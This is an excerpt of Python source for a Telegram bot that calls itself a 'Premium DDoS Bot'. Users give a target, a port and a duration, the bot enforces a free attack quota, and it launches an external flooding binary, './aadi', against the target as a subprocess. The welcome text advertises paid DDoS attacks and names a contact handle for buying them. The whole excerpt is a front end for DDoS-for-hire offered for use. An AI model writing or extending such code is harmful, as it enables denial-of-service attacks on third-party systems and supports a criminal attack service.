...
def handle_attack(message):
    ...
    if attack_count >= FREE_ATTACK_LIMIT:
        bot.reply_to(message, "⚠️ 1 ATTACK ALREADY RUNNING PLEASE WAIT TO RUN ANOTHER ATTACK .")
        return

    command = message.text.split()
    if len(command) != 4:
        bot.reply_to(message, "⚠️ Usage: /aadi <target> <port> <duration>")
        return
...
async def execute_attack(target, port, duration):
    proc = await asyncio.create_subprocess_exec("./aadi", target, str(port), str(duration), "800")
...
def welcome_message(message):
    bot.reply_to(message, "❄️ Welcome to the Premium DDoS Bot. Use to view available commands ./aadi /start\n/resetattacks\n/attack\n/add\n\n𝘿𝙈 -@user_x_dead 𝙏𝙊 𝘽𝙐𝙔 𝙋𝘼𝙄𝘿 𝘿𝘿𝙊𝙎 𝘼𝙇𝙇 𝘼𝙏𝙏𝘼𝘾𝙆 𝙒𝙊𝙍𝙆𝙄𝙉𝙂 ✅\n MAKE SURE RESETATTACKS AFTER 1 ATTACK ")
